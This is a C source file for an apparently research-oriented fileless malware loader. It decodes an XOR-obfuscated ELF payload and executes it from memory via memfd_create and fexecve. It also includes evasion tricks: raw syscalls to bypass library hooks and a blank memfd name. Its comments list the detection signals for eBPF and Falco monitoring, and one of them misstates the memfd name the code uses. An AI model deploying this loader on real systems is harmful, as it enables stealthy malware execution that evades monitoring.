/*
 * loader.c — Fileless Malware Loader
 * ===========================================================
 * Demonstrates the "ExecutableInExecutable" (T1027.002) technique:
 *   1. Decodes an XOR-obfuscated ELF payload embedded as a byte array.
 *   2. Creates an anonymous in-memory file using memfd_create(2).
 *   3. Writes the decoded payload into the memory fd.
 *   4. Executes the in-memory ELF via fexecve(3) — leaving NO on-disk
 *      artifact of the payload binary.
 *
 * Real-world analogues studied:
 *   - Ezuri (Go-based memory loader, AES-256-CTR, LevelBlue SpiderLabs)
 *   - VoidLink Plugin Loader (Zig, ELF object files loaded at runtime,
 *     Check Point Research 2026) — API operates on direct syscalls,
 *     bypassing libc hooks.
 *   - MITRE ATT&CK T1027.002: Obfuscated Files or Information: Software Packing
 *
 * Key syscalls generated (targets for eBPF/strace monitoring):
 *   memfd_create()  — creates anonymous fd
 *   write()         — writes payload bytes
 *   fexecve()       — executes from fd (calls execveat internally)
 *
 * Compile:
 *   gcc -Wall -Wextra -o loader loader.c
 *   (Loader itself is NOT static — it appears like a normal binary)
 *
 * WARNING: FOR ACADEMIC/RESEARCH USE ONLY INSIDE AN ISOLATED VM.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/memfd.h>   /* F_SEAL_WRITE, F_SEAL_SHRINK, F_SEAL_GROW, F_SEAL_SEAL */

/* Auto-generated during build by gen_xor_header */
#include "payload_blob.h"

/* -----------------------------------------------------------------------
 * Wrappers — use raw syscalls to bypass any libc/LD_PRELOAD hooking,
 * mirroring the design philosophy noted in the VoidLink analysis.
 * --------------------------------------------------------------------- */

static int raw_memfd_create(const char *name, unsigned int flags) {
    return (int)syscall(SYS_memfd_create, name, flags);
}

/* -----------------------------------------------------------------------
 * XOR Decoder
 * The XOR_KEY and PAYLOAD_SIZE are defined in payload_blob.h.
 * Using a volatile pointer prevents compiler from optimising the loop out.
 * ----------------------------------------------------------------------- */

static void xor_decode(unsigned char *out, const unsigned char *in, size_t len) {
    volatile unsigned char key = PAYLOAD_XOR_KEY;   /* volatile: anti-optimise */
    for (size_t i = 0; i < len; i++)
        out[i] = in[i] ^ key;
}

/* -----------------------------------------------------------------------
 * Main
 * ----------------------------------------------------------------------- */

int main(int argc __attribute__((unused)), char *argv[] __attribute__((unused)), char *envp[]) {
    /* Set a stable comm name so the LSM can target this loader precisely. */
    (void)prctl(PR_SET_NAME, "loader", 0, 0, 0);
    fprintf(stderr,
        "[LOADER] ============================================================\n"
        "[LOADER] Fileless Loader\n"
        "[LOADER] Technique : memfd_create + fexecve (T1027.002)\n"
        "[LOADER] Payload   : %zu bytes (XOR-encoded, key=0x%02X)\n"
        "[LOADER] ============================================================\n",
        (size_t)PAYLOAD_SIZE, (unsigned)PAYLOAD_XOR_KEY);

    /* Step 1: Allocate a buffer and decode the XOR payload */
    unsigned char *decoded = malloc(PAYLOAD_SIZE);
    if (!decoded) {
        perror("[LOADER] malloc");
        return 1;
    }
    xor_decode(decoded, payload_blob, PAYLOAD_SIZE);
    fprintf(stderr, "[LOADER] Step 1: XOR decode  ... OK (%zu bytes)\n",
            (size_t)PAYLOAD_SIZE);

    /* Step 2: Create an anonymous in-memory file.
     *
     * memfd_create(2) — Linux ≥ 3.17 (kernel 3.17, released 2014).
     *
     * Evasion techniques applied (drawing from VoidLink & TeamTNT CTI):
     *   - Blank name ("") instead of "elf" so /proc/<pid>/fd/ shows
     *     "/memfd: (deleted)" — blending with kernel internal names
     *     rather than advertising the purpose. (VoidLink pattern)
     *   - MFD_ALLOW_SEALING enables us to lock the payload immutable
     *     after writing, mimicking Ezuri/TeamTNT behaviour documented
     *     by Sysdig (2022) and Aqua Security (2022).
     *
     * Forensic signals generated (targets for eBPF/Falco rules):
     *   /proc/<pid>/maps : "/memfd: (deleted)"
     *   strace           : memfd_create("", MFD_CLOEXEC|MFD_ALLOW_SEALING)
     *   strace           : fcntl(fd, F_ADD_SEALS, ...)  ← NEW signal */
    int memfd = raw_memfd_create("", MFD_CLOEXEC | MFD_ALLOW_SEALING);
    if (memfd < 0) {
        perror("[LOADER] memfd_create");
        free(decoded);
        return 1;
    }
    fprintf(stderr, "[LOADER] Step 2: memfd_create ... OK (fd=%d, /proc/self/fd/%d -> /memfd: )\n",
            memfd, memfd);

    /* Step 3: Write decoded ELF bytes to the memory fd */
    size_t written = 0;
    while (written < PAYLOAD_SIZE) {
        ssize_t n = write(memfd, decoded + written, PAYLOAD_SIZE - written);
        if (n < 0) {
            perror("[LOADER] write");
            close(memfd);
            free(decoded);
            return 1;
        }
        written += (size_t)n;
    }
    fprintf(stderr, "[LOADER] Step 3: write payload ... OK (%zu bytes to fd)\n", written);

    /* Security: zero and free the decoded buffer before exec
     * to minimise in-memory exposure of the plaintext ELF */
    explicit_bzero(decoded, PAYLOAD_SIZE);
    free(decoded);

    /* Step 3b: Seal the memfd — mark it read-only and immutable.
     *
     * After sealing, no process (including us) can modify the payload
     * in memory. This mirrors the Ezuri loader behaviour documented by
     * AT&T Alien Labs (2022) and the TeamTNT containers analysed by
     * Aqua Security (2022).
     *
     * Seals applied:
     *   F_SEAL_WRITE  — payload bytes are now read-only
     *   F_SEAL_SHRINK — prevents truncation
     *   F_SEAL_GROW   — prevents extension
     *   F_SEAL_SEAL   — prevents adding further seals (locks the seal set)
     *
     * eBPF/Falco detection signal:
     *   fcntl(fd, F_ADD_SEALS, F_SEAL_WRITE|F_SEAL_SHRINK|...) = 0 */
    int seal_flags = F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_SEAL;
    if (fcntl(memfd, F_ADD_SEALS, seal_flags) < 0) {
        perror("[LOADER] fcntl F_ADD_SEALS");
        /* Non-fatal: sealing failure does not prevent execution.
         * Log and continue — fexecve will still work. */
        fprintf(stderr, "[LOADER] Step 3b: sealing ... SKIPPED (kernel may not support)\n");
    } else {
        fprintf(stderr, "[LOADER] Step 3b: memfd sealed (F_SEAL_WRITE|SHRINK|GROW|SEAL) ... OK\n");
    }

    /* Step 4: Execute the in-memory ELF via fexecve(3).
     *
     * fexecve(fd, argv, envp) is equivalent to:
     *   execve("/proc/self/fd/<fd>", argv, envp)
     * The payload ELF runs as a normal process but its executable
     * path in /proc/<pid>/exe points to the memfd, NOT a real file.
     *
     * strace will show:  execve("/proc/self/fd/3", ...) = 0
     * eBPF (bpftrace/Falco) will show a process_start event with
     * filename = "/memfd:elf (deleted)" — the key detection signal. */
    fprintf(stderr, "[LOADER] Step 4: fexecve     ... calling (no return on success)\n");

    char *exec_argv[] = {"payload", NULL};
    if (fexecve(memfd, exec_argv, envp) < 0) {
        perror("[LOADER] fexecve");
        close(memfd);
        return 1;
    }

    /* Unreachable on success */
    return 0;
}
